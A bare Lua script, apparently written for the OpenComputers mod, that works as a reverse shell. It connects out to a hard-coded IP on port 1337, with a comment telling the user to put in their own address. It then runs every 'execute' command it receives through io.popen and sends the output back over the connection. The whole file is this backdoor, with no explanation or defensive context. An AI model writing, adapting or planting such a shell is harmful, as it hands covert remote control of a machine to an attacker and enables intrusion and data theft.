local internet = require("internet")
local handle = internet.open("188.32.73.250", 1337) --your ip and port here
string.startswith = function(self, str)
    return self:find('^' .. str) ~= nil
end
function split(str, pat)
    local t = {}
    local fpat = "(.-)" .. pat
    local last_end = 1
    local s, e, cap = str:find(fpat, 1)
    while s do
        if s ~= 1 or cap ~= "" then
            table.insert(t, cap)
        end
        last_end = e+1
        s, e, cap = str:find(fpat, last_end)
    end
    if last_end <= #str then
        cap = str:sub(last_end)
        table.insert(t, cap)
    end
    return t
end
while true do
    local data = handle:read()
    if data ~= nil then
        if string.startswith(data, 'execute') then
            command = split(data, ' ')
            table.remove(command, 1)
            command = table.concat(command, ' ')
            local hndl = io.popen(command)
            local result = hndl:read("*a")
            hndl:close()
            handle:write('executed ' .. result)
        end
    end
end
handle:close()